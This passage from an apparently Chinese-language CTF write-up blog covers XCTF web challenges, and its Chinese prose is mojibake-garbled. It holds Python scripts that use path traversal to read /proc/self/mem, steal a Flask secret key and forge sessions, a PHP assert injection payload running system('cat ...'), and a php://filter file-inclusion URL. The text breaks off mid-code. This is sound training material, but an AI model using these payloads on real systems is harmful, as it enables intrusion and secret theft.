<p>sessionçš„ä¼ªé€ éœ€è¦secret_key,è€Œsecret_keyçš„å€¼å¯ä»¥é€šè¿‡å†…å­˜æ•°æ®è·å–ã€‚å…ˆè¯»å–/proc/self/mapsæ–‡ä»¶è·å–å¯è¯»å†…å®¹çš„å†…å­˜æ˜ å°„åœ°å€ã€‚</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250116202058251.png"
	width="1663"
	height="836"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250116202058251_hu7808813953879453528.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250116202058251_hu8111072402984526815.png 1024w"
	loading="lazy"
	
		alt="image-20250116202058251"
	
	
		class="gallery-image" 
		data-flex-grow="198"
		data-flex-basis="477px"
	
></p>
<p>ç”¨è„šæœ¬æ‰¾å‡ºsecret_key</p>
<p>ç¬¬ä¸€ç§ç›´æ¥è®¿é—®urlæ¥æŸ¥æ‰¾</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># coding=utf-8</span>
</span></span><span class="line"><span class="cl"><span class="c1">#----------------------------------</span>
</span></span><span class="line"><span class="cl"><span class="c1">###################################</span>
</span></span><span class="line"><span class="cl"><span class="c1">#Edited by lx56@blog.lxscloud.top</span>
</span></span><span class="line"><span class="cl"><span class="c1">###################################</span>
</span></span><span class="line"><span class="cl"><span class="c1">#----------------------------------</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">ast</span><span class="o">,</span> <span class="nn">sys</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">abc</span> <span class="kn">import</span> <span class="n">ABC</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask.sessions</span> <span class="kn">import</span> <span class="n">SecureCookieSessionInterface</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://61.147.171.105:52969/&#34;</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="c1">#æ­¤ç¨‹åºåªèƒ½è¿è¡ŒäºPython3ä»¥ä¸Š</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">sys</span><span class="o">.</span><span class="n">version_info</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">:</span> <span class="c1"># &lt; 3.0</span>
</span></span><span class="line"><span class="cl">    <span class="k">raise</span> <span class="ne">Exception</span><span class="p">(</span><span class="s1">&#39;Must be using at least Python 3&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="c1">#----------------session ä¼ªé€ ,å•ç‹¬ç”¨ä¹Ÿå¯ä»¥è€ƒè™‘è¿™ä¸ªåº“ï¼š https://github.com/noraj/flask-session-cookie-manager ----------------</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">MockApp</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">secret_key</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">secret_key</span> <span class="o">=</span> <span class="n">secret_key</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">FSCM</span><span class="p">(</span><span class="n">ABC</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">def</span> <span class="nf">encode</span><span class="p">(</span><span class="n">secret_key</span><span class="p">,</span> <span class="n">session_cookie_structure</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="c1">#Encode a Flask session cookie</span>
</span></span><span class="line"><span class="cl">            <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">app</span> <span class="o">=</span> <span class="n">MockApp</span><span class="p">(</span><span class="n">secret_key</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">                <span class="n">session_cookie_structure</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">(</span><span class="n">ast</span><span class="o">.</span><span class="n">literal_eval</span><span class="p">(</span><span class="n">session_cookie_structure</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">                <span class="n">si</span> <span class="o">=</span> <span class="n">SecureCookieSessionInterface</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">                <span class="n">s</span> <span class="o">=</span> <span class="n">si</span><span class="o">.</span><span class="n">get_signing_serializer</span><span class="p">(</span><span class="n">app</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="n">s</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">session_cookie_structure</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="s2">&#34;[Encoding error] </span><span class="si">{}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="k">raise</span> <span class="n">e</span>
</span></span><span class="line"><span class="cl"><span class="c1">#ç”±/proc/self/mapsè·å–å¯è¯»å†™çš„å†…å­˜åœ°å€ï¼Œå†æ ¹æ®è¿™äº›åœ°å€è¯»å–/proc/self/memæ¥è·å–secret key</span>
</span></span><span class="line"><span class="cl"><span class="n">s_key</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">bypass</span> <span class="o">=</span> <span class="s2">&#34;../..&#34;</span>
</span></span><span class="line"><span class="cl"><span class="c1">#è¯·æ±‚fileè·¯ç”±è¿›è¡Œè¯»å–</span>
</span></span><span class="line"><span class="cl"><span class="n">map_list</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="sa">f</span><span class="s2">&#34;info?file=</span><span class="si">{</span><span class="n">bypass</span><span class="si">}</span><span class="s2">/proc/self/maps&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">map_list</span> <span class="o">=</span> <span class="n">map_list</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\\</span><span class="s2">n&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">map_list</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="c1">#åŒ¹é…æŒ‡å®šæ ¼å¼çš„åœ°å€</span>
</span></span><span class="line"><span class="cl">    <span class="n">map_addr</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="k">match</span><span class="p">(</span><span class="sa">r</span><span class="s2">&#34;([a-z0-9]+)-([a-z0-9]+) rw&#34;</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">map_addr</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">start</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">map_addr</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">end</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">map_addr</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">2</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Found rw addr:&#34;</span><span class="p">,</span> <span class="n">start</span><span class="p">,</span> <span class="s2">&#34;-&#34;</span><span class="p">,</span> <span class="n">end</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="c1">#è®¾ç½®èµ·å§‹å’Œç»“æŸä½ç½®å¹¶è¯»å–/proc/self/mem</span>
</span></span><span class="line"><span class="cl">        <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">url</span><span class="si">}</span><span class="s2">/info?file=</span><span class="si">{</span><span class="n">bypass</span><span class="si">}</span><span class="s2">/proc/self/mem&amp;start=</span><span class="si">{</span><span class="n">start</span><span class="si">}</span><span class="s2">&amp;end=</span><span class="si">{</span><span class="n">end</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="c1">#ç”¨åˆ°äº†ä¹‹å‰ç‰¹å®šçš„SECRET_KEYæ ¼å¼ã€‚å¦‚æœå‘ç°*abcdefghå­˜åœ¨å…¶ä¸­ï¼Œè¯´æ˜æˆåŠŸæ³„éœ²secretkey</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="s2">&#34;*abcdefgh&#34;</span> <span class="ow">in</span> <span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="c1">#æ­£åˆ™åŒ¹é…ï¼Œæœ¬é¢˜secret keyæ ¼å¼ä¸º32ä¸ªå°å†™å­—æ¯æˆ–æ•°å­—ï¼Œå†åŠ ä¸Š*abcdefgh</span>
</span></span><span class="line"><span class="cl">            <span class="n">secret_key</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s2">&#34;[a-z0-9]</span><span class="si">{32}</span><span class="s2">\*abcdefgh&#34;</span><span class="p">,</span> <span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">secret_key</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Secret Key:&#34;</span><span class="p">,</span> <span class="n">secret_key</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">                <span class="n">s_key</span> <span class="o">=</span> <span class="n">secret_key</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">                <span class="k">break</span>
</span></span><span class="line"><span class="cl"> 
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç¬¬äºŒç§å…ˆä¿å­˜å†…å®¹åˆ°æ–‡æ¡£å†åˆ©ç”¨</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="n">maps</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;æ”»é˜²ä¸–ç•Œ-catcat-new/test.txt&#39;</span><span class="p">)</span>  <span class="c1"># æ‰“å¼€åä¸º &#39;test.txt&#39; çš„æ–‡ä»¶å¹¶èµ‹å€¼ç»™å˜é‡ maps</span>
</span></span><span class="line"><span class="cl"><span class="n">b</span> <span class="o">=</span> <span class="n">maps</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>  <span class="c1"># è¯»å–æ–‡ä»¶å†…å®¹å¹¶èµ‹å€¼ç»™å˜é‡ b</span>
</span></span><span class="line"><span class="cl"><span class="n">lst</span> <span class="o">=</span> <span class="n">b</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\\</span><span class="s1">n&#39;</span><span class="p">)</span>  <span class="c1"># æ ¹æ®æ¢è¡Œç¬¦ &#39;\n&#39; å°†æ–‡ä»¶å†…å®¹æ‹†åˆ†ä¸ºåˆ—è¡¨ï¼Œå¹¶èµ‹å€¼ç»™å˜é‡ lstï¼Œæ˜ å°„è¡¨ä¸­çš„å†…å®¹æ˜¯ä¸€è¡Œä¸€è¡Œçš„ã€‚</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">lst</span><span class="p">:</span>  <span class="c1"># éå†åˆ—è¡¨ lst ä¸­çš„æ¯ä¸€è¡Œå†…å®¹</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="s1">&#39;rw&#39;</span> <span class="ow">in</span> <span class="n">line</span><span class="p">:</span>  <span class="c1"># å¦‚æœå½“å‰è¡ŒåŒ…å« &#39;rw&#39;ï¼Œ&#39;rw&#39; ä»£è¡¨è¯¥å†…å­˜åŒºåŸŸå¯è¯»å¯å†™ï¼Œ&#39;r&#39;ä»£è¡¨å¯è¯»ï¼Œ&#39;w&#39;ä»£è¡¨å¯å†™</span>
</span></span><span class="line"><span class="cl">        <span class="n">addr</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s1">&#39;([0-9a-f]+)-([0-9a-f]+)&#39;</span><span class="p">,</span> <span class="n">line</span><span class="p">)</span>  <span class="c1"># ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼åœ¨å½“å‰è¡Œä¸­æœç´¢åœ°å€èŒƒå›´å¹¶ä¿å­˜åˆ°å˜é‡ addr ä¸­</span>
</span></span><span class="line"><span class="cl">        <span class="n">start</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">addr</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>  <span class="c1"># å°†åœ°å€èŒƒå›´çš„èµ·å§‹åœ°å€ä»åå…­è¿›åˆ¶è½¬æ¢ä¸ºåè¿›åˆ¶ï¼Œå¹¶èµ‹å€¼ç»™å˜é‡ start</span>
</span></span><span class="line"><span class="cl">        <span class="n">end</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">addr</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">2</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>  <span class="c1"># å°†åœ°å€èŒƒå›´çš„ç»“æŸåœ°å€ä»åå…­è¿›åˆ¶è½¬æ¢ä¸ºåè¿›åˆ¶ï¼Œå¹¶èµ‹å€¼ç»™å˜é‡ end</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">start</span><span class="p">,</span> <span class="n">end</span><span class="p">)</span>  <span class="c1"># æ‰“å°èµ·å§‹åœ°å€å’Œç»“æŸåœ°å€</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">        <span class="c1"># æ„é€ è¯·æ±‚URLï¼Œç”¨äºè¯»å– /proc/self/mem æ–‡ä»¶çš„ç‰¹å®šåŒºåŸŸ</span>
</span></span><span class="line"><span class="cl">        <span class="n">url</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;http://61.147.171.105:52969/info?file=../../../proc/self/mem&amp;start=</span><span class="si">{</span><span class="n">start</span><span class="si">}</span><span class="s2">&amp;end=</span><span class="si">{</span><span class="n">end</span><span class="si">}</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="c1"># å‘é€ GET è¯·æ±‚å¹¶è·å–å“åº”</span>
</span></span><span class="line"><span class="cl">        <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="c1"># ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼ä»å“åº”æ–‡æœ¬ä¸­æ‰¾åˆ°ç¬¦åˆæŒ‡å®šæ ¼å¼çš„ SECRET_KEY</span>
</span></span><span class="line"><span class="cl">        <span class="n">secret_key</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s2">&#34;[a-z0-9]</span><span class="si">{32}</span><span class="s2">\*abcdefgh&#34;</span><span class="p">,</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="c1"># å¦‚æœæ‰¾åˆ°äº† SECRET_KEYï¼Œåˆ™æ‰“å°å¹¶ç»“æŸå¾ªç¯</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">secret_key</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="n">secret_key</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250116202436145.png"
	width="878"
	height="344"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250116202436145_hu9681240433414966833.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250116202436145_hu682595922319698558.png 1024w"
	loading="lazy"
	
		alt="image-20250116202436145"
	
	
		class="gallery-image" 
		data-flex-grow="255"
		data-flex-basis="612px"
	
></p>
<p><strong>æ‹¿åˆ° serect_key ä¹‹åï¼Œå¼€å§‹ç€æ‰‹ä¼ªé€  session:</strong></p>
<p><strong>æˆ‘ä»¬éœ€è¦ç”¨åˆ°ä¸€æ¬¾åœ¨Flaskæ¡†æ¶ä¸­ä¼ªé€ sessionçš„å·¥å…·ï¼šFlask-session-cookie-manager:</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">è§£å¯†ï¼š
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">python flask_session_cookie_manager3.py decode -s &#34;serect_key&#34; -c &#34;session&#34;ï¼ˆsessioné€šè¿‡æŠ“åŒ…è·å–ï¼‰ã€‚
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">åŠ å¯†ï¼š
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">python flask_session_cookie_manager3.py encode -s &#34;serect_key&#34; -t &#34;data&#34; (dataä¸ºæƒ³è¦ä¿®æ”¹çš„æ•°æ®)ã€‚
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250116204613610.png"
	width="1434"
	height="175"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250116204613610_hu434889499326214115.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250116204613610_hu3426268101853358753.png 1024w"
	loading="lazy"
	
		alt="image-20250116204613610"
	
	
		class="gallery-image" 
		data-flex-grow="819"
		data-flex-basis="1966px"
	
></p>
<p>bpæŠ“åŒ…æ”¹session,å¾—åˆ°flag</p>
<h2 id="mfw">mfw
</h2><p>æŸ¥çœ‹å†…å®¹å‘ç°ä»¥pageä¸ºå‚æ•°ä¼ å‚</p>
<p>å†…å®¹è¯´ä»–ä»¥gitæ¥ç®¡ç†ä»£ç </p>
<p>æŸ¥çœ‹æœ‰æ²¡æœ‰gitæºç æ³„éœ²</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250119111347125.png"
	width="1413"
	height="881"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250119111347125_hu16855845551868088325.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250119111347125_hu14656409148216422661.png 1024w"
	loading="lazy"
	
		alt="image-20250119111347125"
	
	
		class="gallery-image" 
		data-flex-grow="160"
		data-flex-basis="384px"
	
></p>
<p>ç¡®å®æœ‰ï¼Œç”¨githackä¸‹è½½æºç </p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250119111743719.png"
	width="620"
	height="218"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250119111743719_hu3348633155416034242.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250119111743719_hu700488049241296127.png 1024w"
	loading="lazy"
	
		alt="image-20250119111743719"
	
	
		class="gallery-image" 
		data-flex-grow="284"
		data-flex-basis="682px"
	
></p>
<p>åªæœ‰index.phpæ˜¯æœ‰ç”¨çš„</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250119112646959.png"
	width="851"
	height="180"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250119112646959_hu11324955619647905831.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250119112646959_hu1683497016388462821.png 1024w"
	loading="lazy"
	
		alt="image-20250119112646959"
	
	
		class="gallery-image" 
		data-flex-grow="472"
		data-flex-basis="1134px"
	
></p>
<p>ä¸»è¦çš„åˆ©ç”¨ç‚¹åœ¨è¿™</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">assert</span><span class="p">(</span><span class="s2">&#34;strpos(&#39;</span><span class="si">$file</span><span class="s2">&#39;, &#39;..&#39;) === false&#34;</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s2">&#34;Detected hacking attempt!&#34;</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">assertå‡½æ•°ä¼šæŠŠè¯»è¿›æ¥çš„ä»£ç å½“ä½œphpæ‰§è¡Œï¼Œstrpos â€” æŸ¥æ‰¾å­—ç¬¦ä¸²é¦–æ¬¡å‡ºç°çš„ä½ç½®
</span></span><span class="line"><span class="cl">å…ˆæŠŠstrposé—­åˆ,&#39;)ç”¨.æ¥æ‹¼æ¥è¯­å¥ï¼Œç”¨//æŠŠ&#39;..&#39;) === false&#34;) or die(&#34;Detected hacking attempt!&#34;);æ³¨é‡Š
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250119113704068.png"
	width="1881"
	height="824"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250119113704068_hu18166407736922564807.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250119113704068_hu11328242402843689726.png 1024w"
	loading="lazy"
	
		alt="image-20250119113704068"
	
	
		class="gallery-image" 
		data-flex-grow="228"
		data-flex-basis="547px"
	
></p>
<p>payload</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">å› ä¸ºçŸ¥é“flagåœ¨templatesæ–‡ä»¶å¤¹ä¸‹é¢
</span></span><span class="line"><span class="cl">?page=&#39;).system(&#34;cat templates/flag.php&#34;);//
</span></span></code></pre></td></tr></table>
</div>
</div><p>æŸ¥çœ‹æºç å¾—åˆ°flag</p>
<h2 id="ics-05">ics-05
</h2><p>æŸ¥çœ‹æºç å‘ç°æœ‰?page=index</p>
<p>çŒœæµ‹æ˜¯æ–‡ä»¶åŒ…å«</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250119130543205.png"
	width="1571"
	height="935"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250119130543205_hu5192714493201707958.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250119130543205_hu6508868839321829571.png 1024w"
	loading="lazy"
	
		alt="image-20250119130543205"
	
	
		class="gallery-image" 
		data-flex-grow="168"
		data-flex-basis="403px"
	
></p>
<p>ç”¨ä¼ªåè®®è¯»index.php</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://61.147.171.105:65276/index.php?page=php://filter/read=convert.base64-encode/resource=index.php
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
